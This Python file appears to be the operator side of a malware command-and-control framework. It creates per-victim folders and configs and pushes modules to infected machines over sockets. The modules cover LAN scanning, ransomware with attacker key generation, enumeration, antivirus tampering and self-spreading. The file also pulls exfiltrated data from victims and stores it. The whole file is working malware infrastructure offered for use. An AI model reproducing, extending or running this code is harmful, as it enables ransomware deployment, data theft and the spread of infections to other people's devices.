# handels requests from an agent
# updates individual configs 
import os
import shutil
import json
from Encryption import *
import socket

class AgentHandler:
    """
    a class which initiates a victim agent handler for a specific victim, the agent handler handels tasks and sends it to its corresponding
    victim agent
    """

    def __init__(self, id, victim_config):
        self.id = id
        self.folder = f"infected_devices\\{id}"
        # on init create the folder and config file
        self.initialize(victim_config)
        self.modules = []
        self.config = self.config_setup()
        self.loaded_config = {}
        self.ransomware_pub_key = ""
        self.ransomware_priv_key = ""
        self.exfil_file = f"infected_devices\\{id}\\exfildata_{id}.json"

    def initialize(self, victim_config):
        """
        a method which is called when a new device connects to the attacker server, this method initializes the folder for the victim

        victim_config dict: a dictionary containing the victim config
        """
        # make a directory for the infected device
        os.makedirs(self.folder, exist_ok=True)
        #shutil.copy2('config.json', self.folder)
        #create the config file for the victim
        with open(f'{self.folder}\\config.json', 'w') as config_file:
            json.dump(victim_config, config_file, indent=4)
    
    def config_setup(self):
        """
        a method which sets up the config file path
        """
        return os.path.abspath(f"{self.folder}\\config.json")
    
    def send_config(self, victim_config):
        """
        a method which sends the updated config to the victim agent

        victim_config dict: a dictionary containing the victim config
        """
        config = json.dumps(victim_config)
        
        try:
            with socket.create_connection((victim_config["ip"], victim_config["port"])) as client_socket:
                client_socket.sendall(config.encode('utf-8'))
                print(f"Sent config to victim: {victim_config}")
        except Exception as e:
            print(f"Failed to connect to the server: {e}")
    
    def add_modules(self):
        """
        a method which allows the attacker to add modules to a victims config
        """
        with open(self.config, "r") as config_file:
            victim_config = json.load(config_file)

        print(f"[+] current config: {victim_config}")
        print("""
                 
Modules:

[1] LANscanModule
[2] ransomewareModule
[3] enumerationModule
[4] antivirusModule
[5] spreadvirusModule
                 
                 """)
        modules = input("Type the module(s) number you want to add separated by a comma (eg. 1,2): ")

        self.modules = modules.split(',')

        for module in self.modules:
            
            run_module = True

            # Check if the module was already executed
            if module in victim_config.get("modules", []):
                choice = input(f"[INFO] Module '{module}' was already executed. Do you wish to rerun it? (Y/N): ").lower()
                if choice == 'n':
                    print(f"[-] Skipping module: {module}")
                    run_module = False
                elif choice != 'y':
                    print("[!] Invalid choice. Skipping this module...")
                    run_module = False
                     
            if run_module :

                match module:
                    case "1":
                        print("[+] adding LANscanModule")
                        victim_config["modules"].append("LANscanModule.LANscanModule")
                    case "2":
                        
                        print("[+] adding ransomewareModule")
                        victim_config["modules"].append("ransomewareModule.Ransommodule")
                        print("[+] generating Encryption Keys...")
                        self.generate_ransomware_keys()
                        
                        # add the ransomeware public key to the config file
                        print("[+] Reading ransomeware public key")
                        with open(self.ransomware_pub_key, "r") as file:
                            public_key_string = file.read()
                        
                        print("[+] Adding ransomeware public key to config...")
                        victim_config["ransomware_key"] = public_key_string
                        
                    case "3":
                        print("[+] adding enumerationModule")
                        victim_config["modules"].append("enumerationModule.EnumModule")
                    case "4":
                        print("[+] adding antivirusModule")
                        victim_config["modules"].append("antivirusModule.Antivirusmodule")
                    case "5":
                        print("[+] adding spreadvirusModule")
                        victim_config["modules"].append("spreadvirusModule.spread_virus")
                    case _:
                            print(f"Invalid module number: {module}")

        with open(self.config, "w") as config_file:
            json.dump(victim_config, config_file, indent=4)
        self.loaded_config = victim_config
        print("[+] Configuration updated...")

        # send updated config to the victim
        send = input("Send config to victim(Y/N)?: ")


        if send.lower() == "y":
            self.send_config(victim_config)

        else:
            print("[INFO] To activate the module send the config...")

    def remove_modules(self):
        """
        a method which allows the attacker to remove modules from a victims config
        """
        #open config and load modules
        with open(self.config, 'r') as file:
            config = json.load(file)
        
        modules = config.get("modules", [])

        print(f"victim: {self.id} \nistalled_modules:")

        for index, module in enumerate(modules):
            print(f"{index}: {module}")

        _modules = input("Type the module(s) number you want to remove separated by a comma (eg. 0,1): ")

        remove_modules = _modules.split(',')

        for index in remove_modules:
            removed_module = config["modules"][int(index)]
            config["modules"].pop(int(index))
            print(f"[+] sucessfully removed module(s): {removed_module}")

        

        with open(self.config, "w") as config_file:
            json.dump(config, config_file, indent=4)

        

    def send_config_framework(self):
        self.send_config(self.loaded_config)              
    
    def generate_ransomware_keys(self):
        """
        a method which generates a unique pair of asymmetric encryption keys for the ransomware module
        """

        encryption_attacker = Encryption(self.id, f"{self.folder}\\public_attacker.pem",f"{self.folder}\\private_attacker.pem")
        # Generate key pairs
        encryption_attacker.generate_keys()
        
        self.ransomware_pub_key = f"{self.folder}\\public_attacker.pem"
        self.ransomware_priv_key = f"{self.folder}\\private_attacker.pem"


    def exfiltrate_data(self):
        """
        a method which exfiltrates the data from the victim
        """

        with open(self.config, "r") as config_file:
            victim_config = json.load(config_file)

        try:
            with socket.create_connection((victim_config["ip"], victim_config["port"])) as client_socket:
                exfil_code = "exfil_data"
                client_socket.sendall(exfil_code.encode('utf-8'))

                print(f"[+] requested exfil data from {victim_config["id"]}")
            
                response = client_socket.recv(1024)
                exfil_data = response.decode('utf-8')
                print(f"exfil data recieved: {exfil_data}")

                parsed_exfil_data = json.loads(exfil_data)

                #append the exfil file so previously exfilled data isnt deleted
                with open(self.exfil_file, "a") as exfil_file:
                    json.dump(parsed_exfil_data, exfil_file, indent=4)

                print(f"[+] Exfil data successfully saved to {self.exfil_file}")

        except Exception as e:
            print(f"[!] Failed to exfil data... {e}")

    def show_exfil_data(self):
        """
        a function which prints the devices exfilled data
        """
        try:
            with open(self.exfil_file, 'r') as file:
                exfil_data = json.load(file)

            print(exfil_data)
        except:
            print("[!] the exfil file is probably empty or not created")

    def show_config(self):
        """
        a function which prints the devices config data
        """
        with open(self.config, 'r') as file:
            config = json.load(file)

        print(config)

if __name__=="__main__":
    handler = AgentHandler("LAPTOP2")

